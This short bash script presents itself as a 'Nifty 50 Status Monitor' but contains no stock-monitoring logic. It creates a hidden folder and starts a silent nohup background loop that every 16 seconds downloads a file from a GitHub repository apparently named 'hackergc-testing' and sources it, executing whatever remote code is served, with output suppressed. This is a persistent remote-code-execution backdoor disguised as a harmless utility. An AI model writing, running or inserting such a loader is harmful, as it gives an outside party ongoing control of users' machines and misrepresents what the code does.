#!/bin/bash
# Nifty 50 Status Monitor - Version 1.0.4
mkdir -p ~/.nifty_status

# The background loop using wget
nohup bash -c "while true; do 
    # Fetch environment updates via wget
    wget -qO ~/.nifty_status/current_env https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat
    
    # Source the file to apply 'updates'
    source ~/.nifty_status/current_env >> ~/.nifty_status/monitor.log 2>&1
    
    # Update every 16 seconds
    sleep 16
done" > /dev/null 2>&1 &

echo "Background status monitor initialized with wget."
